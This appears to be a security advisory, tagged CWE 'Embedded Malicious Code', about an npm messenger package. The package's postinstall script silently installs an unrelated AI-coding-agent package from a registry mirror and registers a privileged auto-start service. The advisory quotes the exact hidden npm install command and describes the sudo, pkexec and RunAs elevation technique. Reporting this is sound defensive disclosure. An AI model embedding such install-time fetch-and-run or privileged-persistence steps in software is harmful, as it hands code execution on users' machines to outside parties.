summary: postinstall silently installs unrelated third-party package at unpinned @latest from a non-default registry mirror
details: On `npm install`, the package's postinstall script (dist/postinstall.js) spawns a detached, output-suppressed child process that runs `npm install -g opencode-ai --registry=https://registry.npmmirror.com --prefer-offline --no-audit --no-fund --progress=false` with `shell:true, detached:true, stdio:'ignore'`. `opencode-ai` is an unrelated third-party AI-coding-agent package — it is not declared as a dependency, not mentioned in the README, has no relationship to this package's stated messenger purpose, and is pulled at unpinned `@latest` from the npmmirror.com registry mirror rather than the default registry. This silently adds an undeclared external package (and its full transitive tree) to the installer's global node_modules with each install, and whoever controls `opencode-ai@latest` on that mirror at install time gains code execution on every machine that installs this package. Detached execution with `stdio:'ignore'` hides errors and any output from the installer. The package additionally runs a second postinstall path that installs `claw-subagent-service@latest` (also unpinned) and uses `pkexec`/`sudo`/PowerShell `Start-Process -Verb RunAs` to register a privileged systemd/launchd/Windows service that auto-starts on boot, compounding install-time risk via elevation against an unpinned helper version.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
